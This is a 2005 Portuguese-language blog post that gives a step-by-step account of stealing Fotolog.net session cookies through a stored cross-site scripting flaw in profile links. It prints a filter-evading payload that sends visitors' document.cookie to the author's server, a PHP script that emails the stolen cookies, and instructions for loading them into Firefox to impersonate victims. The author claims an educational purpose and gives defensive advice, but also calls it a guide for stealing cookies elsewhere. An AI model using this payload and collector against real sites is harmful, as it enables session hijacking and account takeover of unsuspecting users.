---
title: Falha no Fotolog.net
type: post
date: 2005-02-17T16:22:47+00:00
excerpt: A descrição de como descobri que consegui pegar o cookie do Fotolog.net de qualquer pessoa que entra no meu profile num Fotolog.net
url: /2005/02/falha-no-fotolognet/
categorias:
  - Dicas
tags:
  - cookies
  - dica
  - falha
  - fotolog
  - hacker
  - javascript
  - web
  - xss

---
Segue a descrição de como descobri que consigo pegar o cookie do Fotolog.net de qualquer pessoa que entra no meu profile, e com isso, poder:

  * Adicionar comentários em qualquer fotolog como a pessoa
  * Remover comentários do fotolog da pessoa
  * Adicionar/remover FF list
  * Ver e-mail de cadastro da pessoa

**[update]** Parece que isso não funciona mais hoje. De qualquer maneira, é um bom guia (acho que tá bem detalhado) para _roubar cookies_ de vários outros sitemas que tenham falhas como esta (e não são poucos). **[/update]**

Nos últimos dias, alguém pegou a senha do Fotolog.net de um amigo meu e ele me pediu para que eu tentasse recuperar. Não consegui descobrir senha. Porém, usando furos do Fotolog.net e do Internet Explorer, descobri que consigo estar loggado com qualquer usuário que entre no meu perfil! Já que é preciso escrever a senha em cada página do Fotolog.net (upload, mudar profile, etc.) a única coisa que posso fazer loggado como a pessoa é escrever comentários, mas mesmo assim já é uma coisa estranha que merece a atenção do administrador do Fotolog.net (para o qual irei enviar um e-mail). Irei postar um “passo-a-passo” de como pegar o cookie de login do Fotolog.net e com isto, loggar como a pessoa que perdeu esse cookie.

O cookie do Fotolog.net dura mais de um ano… Isso é um problema grave de segurança, mas não é utilizando esta falha que faço tudo. O que eu fiz foi um JavaScript dentro de um CSS redirecionar para uma página PHP com função mail que me envia a função document.cookie do JavaScript que roda no cliente na página do Fotolog.net! É um pouco difícil de explicar, mas não tão complicado. Meu objetivo postando aqui não é incentivar que as pessoas façam isso (eu só fiz comigo mesmo testando), mas incentivar os que possuem conta no Fotolog.net usarem browsers decentes (como Firefox ou Opera) ou não clicar em profiles de estranhos. Tenho certeza de que hackers de verdade não usarão isto para o mal, mas sim para fins de aprendizagem, como eu fiz; mas parece que vários newbies por aí se acham e se acharão o máximo postando comentários como outras pessoas com a minha “receita de bolo”! Por esses, preciso lamentar e mandar ler a definição de hacker no Jargon File.

A primeira barreira que tive que ultrapassar foi que só 500 brasileiros por dia podem se registrar no Fotolog.net! Bom… Eu tava ansioso pra tentar fazer isso e já que eu não tinha tempo a perder, entrei no site [Public Proxy Servers][1] e usando um proxy high-anonimity do Vietnã me registrei no Fotolog.net… Perfeito! Apareceu que nenhum visitante do Vietnã tinha se cadastrado no dia.

Então, fui até o meu profile e no endereço do meu site eu tentei colocar aspas. Percebi que funcionou, então testei um código de bastante fácil entendimento:

```
#" style="background:url(javascript:location.href='http://tableless.tiagomadeira.net/foo.php'+escape(document.cookie))
```

Mas não funcionou porque o Fotolog.net não permite “javascript” na frase. Então após alguns testes cheguei ao:

```
#" style="background:url(ja       vas       cript:location.href=%27 http://www.tiagomadeira.net/r.php?c=%27       +escape(document.cookie))
```

_OBS.: Tenho recebido e-mail de pessoas dizendo que o não cabe… O meu também não cabia, mas é só questão de diminuir o endereço._

Este código só funciona porque o _Internet Explorer_ é problemático! Não tem nada a ver um _JavaScript_ dentro de uma url de fundo e ainda ir para este endereço! E o [Fotolog.net][2] também tem um bug seríssimo porque não deveria poder se usar aspas no endereço de um site! Daí no meu profile aparece no lugar do endereço da minha página:

```html
<a href="#" style="background:url(ja       vas       cript:location.href=%27 http://www.tiagomadeira.net/r.php?c=%27       +escape(document.cookie))">#" style="background:url(ja       vas       cript:location.href=%27 http://www.tiagomadeira.net/r.php?c=%27       +escape(document.cookie))</a>
```

Bom, depois disso basta fazer uma página PHP que passe este valor do c para um banco de dados ou e-mail (no meu caso, preferi por e-mail mesmo). Criei uma página no meu /r.php com:

```php
<?php
$cookie=$_GET["c"];
mail("meu@email", "Presente pra você!", "$cookie");
Header("Location: http://tableless.tiagomadeira.net");
?>
```

E o último problema que enfrentei então foi colocar este cookie no meu Firefox. Depois de vários testes, descobri que eu podia editar os cookies do meu Firefox. Para isto abri meu _>~/.mozilla/firefox/profiles/??????.default/cookies.txt_ e modifiquei o cookie para o que eu recebi no e-mail. E finalmente loggado!

#### Vou tentar simplificar o “algoritmo”:

  * A pessoa está loggada (sempre, pois o cookie do fotolog.net é gigantesco) e entra no meu perfil.
  * Meu perfil pega o cookie do Fotolog.net deste computador (que precisa estar usando Internet Explorer) e me envia via a função mail do PHP.
  * Eu troco o cookie do meu Firefox pelo que eu recebi no e-mail e com isto fico loggado como a pessoa!

Interessante, né?

Bom, como já havia dito, isto foi apenas para fins de aprendizagem e descobri tudo isto justamente porque algum lammer pegou a senha de um amigo meu, mas espero que as pessoas aprendam a lição para não se tornarem as vítimas deste _“golpe”_.

**Eu conheço três formas para se tornar resistente a esse golpe:**

  * Não utilizar Internet Explorer. Sugiro [Firefox][3] (o que eu uso), [Opera][4], [Konqueror][5], entre outros…
  * Não utilizar [Fotolog.net][2]. Sugiro [Flickr][6].
  * Não clicar em profiles de estranhos.

Bom… É isso aí.

Aprendi muito com isto e por isso compartilho este conhecimento neste post para que outros também possam aprender. Quem puder, divulgue para seus amigos para que eles não sejam vítimas desse tipo de coisa.

 [1]: http://www.publicproxyservers.com
 [2]: http://www.fotolog.net
 [3]: http://www.getfirefox.com
 [4]: http://www.opera.com
 [5]: http://konqueror.kde.org
 [6]: http://www.flickr.com

